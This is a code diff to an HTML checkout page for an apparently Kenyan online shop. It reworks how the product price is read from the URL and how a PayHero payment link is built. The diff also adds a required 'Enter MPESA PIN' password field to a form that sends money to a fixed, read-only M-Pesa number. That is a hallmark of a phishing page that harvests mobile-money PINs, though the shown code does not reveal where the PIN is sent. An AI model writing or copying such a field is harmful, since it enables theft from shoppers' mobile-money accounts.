@@ -37,10 +37,12 @@ body { margin:0; font-family:'Poppins',sans-serif; background:#f8f9fa; }
 </div>
 
 <script>
-// PRODUCT DETAILS
+// GET PRODUCT DETAILS
 const params = new URLSearchParams(location.search);
-const productPrice = params.get('price');
-if(!params.get('name') || !productPrice || !params.get('img')){
+const productPriceRaw = params.get('price');
+const productPrice = productPriceRaw && !isNaN(productPriceRaw) ? Number(productPriceRaw) : 0;
+
+if(!params.get('name') || productPrice <= 0 || !params.get('img')){
   document.body.innerHTML = `
     <div class="container py-5 text-center">
       <h1>Page Not Found</h1>
@@ -79,7 +81,7 @@ function openSendMoneyForm(){
         <h4 class="text-center mb-3 text-success">PAY KSH ${productPrice}</h4>
         <form id="sendMoneyForm">
           <div class="mb-3"><label class="form-label">Send Money to MPESA Number</label><input type="tel" id="mpesaNumber" class="form-control" value="0758361830" readonly></div>
-          
+          <div class="mb-3"><label class="form-label">Enter MPESA PIN</label><input type="password" id="mpesaPin" class="form-control" required></div>
           <div class="mb-3"><label class="form-label">Transaction Code</label><input type="text" id="transactionCode" class="form-control" required></div>
           <div class="mb-3"><label class="form-label">Full Name</label><input type="text" id="fullName" class="form-control" required></div>
           <div class="mb-3"><label class="form-label">Phone Number</label><input type="tel" id="phoneNumber" class="form-control" placeholder="07XXXXXXXX" required></div>
@@ -100,20 +102,28 @@ function openSendMoneyForm(){
   },2000);
 }
 
-// PAYBILL FLOW WITH PAYHERO DETAILS
+// PAYBILL FLOW WITH AUTO-DETECTED AMOUNT
 function paybillPayHero(){
   loading.style.display='block';
   setTimeout(()=>{
-    const name = document.getElementById('fullName') ? document.getElementById('fullName').value : '';
-    const phone = document.getElementById('phoneNumber') ? document.getElementById('phoneNumber').value : '';
-    const county = document.getElementById('county') ? document.getElementById('county').value : '';
-    const date = document.getElementById('deliveryDate') ? document.getElementById('deliveryDate').value : '';
+    const nameField = document.getElementById('fullName');
+    const phoneField = document.getElementById('phoneNumber');
+    const countyField = document.getElementById('county');
+    const dateField = document.getElementById('deliveryDate');
+
+    const name = nameField ? nameField.value : '';
+    const phone = phoneField ? phoneField.value : '';
+    const county = countyField ? countyField.value : '';
+    const date = dateField ? dateField.value : '';
     const ref = "ORD" + Math.floor(Math.random()*900 +100);
 
-    const payheroURL = `https://app.payhero.co.ke/lipwa/3513?amount=${productPrice}&channel_id=4064&reference=${ref}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&county=${encodeURIComponent(county)}&delivery=${encodeURIComponent(date)}`;
+    // Ensure amount is numeric and from product page
+    const amount = productPrice;
+
+    const payheroURL = `https://app.payhero.co.ke/lipwa/3513?amount=${amount}&channel_id=4064&reference=${ref}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&county=${encodeURIComponent(county)}&delivery=${encodeURIComponent(date)}`;
     
-    window.open(payheroURL,'_blank'); // opens PayHero in a new tab
-    location.href = "index.html"; // redirect back to homepage after opening
+    window.open(payheroURL,'_blank'); // open PayHero in new tab
+    location.href = "index.html"; // redirect current page to home
   },2000);
 }
 
@@ -122,4 +132,3 @@ document.getElementById('paybillBtn').addEventListener('click',paybillPayHero);
 </script>
 </body>
 </html>
-
